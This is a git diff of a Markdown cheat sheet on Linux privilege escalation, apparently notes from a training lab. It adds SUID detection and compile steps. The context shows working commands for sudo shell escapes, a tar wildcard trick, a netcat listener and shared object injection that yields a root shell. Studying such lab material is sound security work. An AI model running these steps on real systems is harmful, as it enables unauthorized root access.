@@ -30,14 +30,16 @@
       - [awk](#awk)
       - [less](#less)
       - [FTP](#ftp)
-      - [NMAP](#nmap)
+      - [nmap](#nmap)
       - [more](#more)
-    + [Sudo Environment Variables](#sudo-environment-variables)
+      - [Apache2](#apache2)
+    + [Sudo -l LD_PRELOAD](#sudo--l-ld-preload)
+      - [Sudo -l LD_PRELOAD Method 2](#sudo--l-ld-preload-method-2)
     + [Cron Jobs -File permissions](#cron-jobs--file-permissions)
     + [Cron Jobs Path Environment Variable](#cron-jobs-path-environment-variable)
     + [CronJobs - Wildcards](#cronjobs---wildcards)
-    + [SUID and SGID Executables --Known Exploits](#suid-and-sgid-executables---known-exploits)
-    + [SUID and SGID Executables-Shared Object Injection](#suid-and-sgid-executables-shared-object-injection)
+    + [SUID and SGID Executables --GTFO Bins](#suid-and-sgid-executables---gtfo-bins)
+    + [SUID-Shared Object Injection](#suid-shared-object-injection)
     + [SUID and SGID Executables-Environment Variables](#suid-and-sgid-executables-environment-variables)
     + [SUID and SGID Executables-Abusing Shell Features 1](#suid-and-sgid-executables-abusing-shell-features-1)
     + [SUID and SGID Executables-Abusing Shell Features 2](#suid-and-sgid-executables-abusing-shell-features-2)
@@ -295,7 +297,7 @@ sudo /usr/bin/less /etc/profile
 sudo /usr/bin/ftp
 !/bin/bash
 ````
-#### NMAP
+#### nmap
 - Method 1
 ````
 TF=$(mktemp)
@@ -458,7 +460,7 @@ touch /home/user/--checkpoint-action=exec=shell.elf
 ````
 nc -nvlp 4444
 ````
-### SUID and SGID Executables --Known Exploits
+### SUID and SGID Executables --GTFO Bins
 - Find all the SUID/SGID executables on the Debian VM:
 ````
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
@@ -466,12 +468,14 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 - Note that /usr/sbin/exim-4.84-3 appears in the results. Exploit is in this repo. 
 - Exploit-DB, Google, and GitHub are good places to search!
 - Check GTFO Bins and Google for SUID/SGID!!!
-### SUID and SGID Executables-Shared Object Injection
+### SUID-Shared Object Injection
+- Detection
+````
+find / -type f -perm -04000 -ls 2>/dev/null
+````
+- Make note of all the SUID binaries
 - The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
 - First, execute the file and note that currently it displays a progress bar before exiting:
-````
-/usr/local/bin/suid-so
-````
 - Run strace on the file and search the output for open/access calls and for "no such file" errors:
 ````
 strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
@@ -484,6 +488,8 @@ mkdir /home/user/.config
 - Example shared object code can be found at `/home/user/tools/suid/libcalc.c`. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
 ````
 gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+IF ERRORS TRY:
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 ````
 - Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
 ````
